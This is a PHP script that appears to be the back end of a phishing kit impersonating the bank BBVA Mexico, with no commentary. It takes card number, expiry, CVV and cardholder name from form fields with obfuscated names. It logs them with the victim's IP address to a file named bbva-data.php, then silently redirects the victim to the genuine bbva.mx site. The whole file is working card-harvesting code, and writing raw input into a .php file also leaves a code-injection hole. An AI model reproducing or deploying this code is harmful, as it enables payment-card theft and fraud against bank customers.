<?php

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'];
}

if (!empty($_POST["fgdfge"]) && !empty($_POST["igfzvd"]) && !empty($_POST["uemfif"]) && !empty($_POST["xcdfgb"]) && !empty($_POST["tbmxoa"])) {

    $cn = $_POST['fgdfge'];
    $mm = $_POST['igfzvd'];
    $yy = $_POST['uemfif'];
    $cs = $_POST['xcdfgb'];
    $nam = $_POST['tbmxoa'];

    file_put_contents("bbva-data.php", "<br>Number: " . $cn . "\n", FILE_APPEND);
    file_put_contents("bbva-data.php", "<br>MM: " . $mm . "\n", FILE_APPEND);
    file_put_contents("bbva-data.php", "<br>YY: " . $yy . "\n", FILE_APPEND);
    file_put_contents("bbva-data.php", "<br>CVV: " . $cs . "\n", FILE_APPEND);
    file_put_contents("bbva-data.php", "<br>Name: " . $nam . "\n", FILE_APPEND);
    file_put_contents("bbva-data.php", "<br>\n", FILE_APPEND);
    file_put_contents("bbva-data.php", "<br>IP: " . $ipaddress . "\n", FILE_APPEND);
    file_put_contents("bbva-data.php", "<br>------------------------------\n", FILE_APPEND);
    header('refresh:0;url=https://www.bbva.mx/');
} else {
    header('location: index.html');
    exit();
}
?>